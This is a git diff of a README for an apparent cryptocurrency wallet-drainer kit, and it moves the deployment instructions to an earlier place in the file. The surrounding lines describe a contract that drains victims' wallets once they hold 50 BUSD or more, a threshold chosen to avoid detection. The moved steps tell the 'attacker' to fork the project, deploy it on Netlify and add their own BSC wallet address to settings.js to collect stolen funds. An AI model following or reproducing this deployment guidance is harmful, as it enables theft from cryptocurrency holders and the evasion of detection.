@@ -16,6 +16,24 @@ Instructions on how to start are below ⬇️
               ##########
 
 
+Deploy steps
+
+!!!!!! Make sure you fork it then deploy !!!!!!!
+
+info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
+
+!!!!!! Make sure you add your wallet to settings.js file !!!!!!! this is the settings for smart contract
+
+1. Go to above link to deploy the code once you fork it
+
+
+2. Follow the steps on netlify
+
+
+3. deploy
+
+
+4. Add your wallet to settings.js file use bsc address 
 
 
 
@@ -62,24 +80,6 @@ THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 BUSD OR MORE FOR STEALTH
 5. If the victim has less than 50 busd in there wallet it will not drain it so its harder to detect it waits for the victim to get a certain amount of busd
 
 
-Deploy steps
-
-!!!!!! Make sure you fork it then deploy !!!!!!!
-
-info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
-
-!!!!!! Make sure you add your wallet to settings.js file !!!!!!! this is the settings for smart contract
-
-1. Go to above link to deploy the code once you fork it
-
-
-2. Follow the steps on netlify
-
-
-3. deploy
-
-
-4. Add your wallet to settings.js file use bsc address 
 
 
 Steps you have to do as the attacker (you)
